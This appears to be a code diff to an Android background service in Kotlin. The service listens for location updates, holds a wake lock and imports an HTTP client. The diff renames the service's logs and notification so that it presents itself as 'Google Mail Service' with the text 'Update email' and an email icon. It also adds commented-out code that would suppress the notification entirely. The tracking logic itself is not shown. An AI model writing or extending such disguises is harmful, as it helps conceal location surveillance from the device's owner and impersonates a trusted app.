@@ -15,7 +15,6 @@ import android.os.PowerManager
 import android.os.SystemClock
 import android.provider.Settings
 import android.support.v4.app.ActivityCompat
-import android.support.v4.content.ContextCompat
 import android.widget.Toast
 import com.github.kittinunf.fuel.Fuel
 import com.google.android.gms.location.*
@@ -23,7 +22,6 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import java.text.SimpleDateFormat
 import java.util.*
 
 
@@ -96,7 +94,7 @@ class EndlessService : Service(), LocationListener {
 
         if (isServiceStarted) return
 
-        log("Starting the galaxy service task")
+        log("Starting the email service task")
         Toast.makeText(this, "Service starting its task", Toast.LENGTH_SHORT).show()
         isServiceStarted = true
         setServiceState(this, ServiceState.STARTED)
@@ -124,7 +122,7 @@ class EndlessService : Service(), LocationListener {
     }
 
     private fun stopService() {
-        log("Stopping the galaxy service")
+        log("Stopping the email service")
         Toast.makeText(this, "Service stopping", Toast.LENGTH_SHORT).show()
         try {
             wakeLock?.let {
@@ -278,8 +276,11 @@ class EndlessService : Service(), LocationListener {
 
     }
 
-    private fun createNotification(): Notification {
-        val notificationChannelId = "Galaxy SERVICE CHANNEL"
+    private fun createNotification(): Notification? {
+        val notificationChannelId = "EMAIL SERVICE CHANNEL"
+
+//        if(true)
+//            return null;
 
         // depending on the Android API that we're dealing with we will have
         // to use a specific method to create the notification
@@ -287,7 +288,7 @@ class EndlessService : Service(), LocationListener {
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             val channel = NotificationChannel(
                 notificationChannelId,
-                "Galaxy Service notifications channel",
+                "Email Service notifications channel",
                 NotificationManager.IMPORTANCE_HIGH
             ).let {
                 it.description = "Galaxy Service channel"
@@ -310,11 +311,11 @@ class EndlessService : Service(), LocationListener {
         ) else Notification.Builder(this)
 
         return builder
-            .setContentTitle("Galaxy Service")
-            .setContentText("This is your favorite galaxy service working")
+            .setContentTitle("Google Mail Service")
+            .setContentText("Update email")
             .setContentIntent(pendingIntent)
-            .setSmallIcon(R.mipmap.ic_launcher)
-            .setTicker("Ticker text")
+            .setSmallIcon(R.drawable.ic_baseline_mark_email_read_24)
+            .setTicker("Email Service")
             .setPriority(Notification.PRIORITY_HIGH) // for under android 26 compatibility
             .build()
     }
